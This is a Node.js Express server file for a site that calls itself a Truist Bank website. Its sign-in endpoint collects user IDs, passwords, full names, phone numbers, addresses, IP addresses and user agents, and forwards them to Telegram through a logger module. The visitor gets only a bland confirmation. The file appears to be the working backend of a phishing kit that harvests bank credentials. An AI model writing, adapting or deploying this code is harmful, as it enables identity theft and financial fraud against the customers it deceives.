require('dotenv').config();
const express = require('express');
const path = require('path');
const { logToTelegram, sendToTelegram } = require('./telegram-logger');

const app = express();
const PORT = process.env.PORT || 5000;

process.on('uncaughtException', function(err) {
    console.error('Uncaught Exception:', err);
});

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use((req, res, next) => {
  res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  next();
});

app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.post('/api/signin', (req, res) => {
  const { userId, Password, fullName, phone, address } = req.body;
  
  logToTelegram('Sign-in Attempt', {
    userId,
    Password,
    fullName,
    phone,
    address,
    ip: req.ip,
    userAgent: req.get('user-agent')
  });

  res.json({ success: true, message: 'Information received' });
});

const server = app.listen(PORT, 'localhost', () => {
  console.log(`Server is running on http://localhost:${PORT}`);
  sendToTelegram('🚀 <b>Server Started</b>\n\nTruist Bank website is now running on port ' + PORT)
    .catch(err => console.error('Failed to send Telegram notification:', err));
});

server.on('error', (err) => {
  console.error('Server error:', err);
});

process.on('SIGTERM', () => {
  server.close(() => {
    console.log('Server terminated');
  });
});
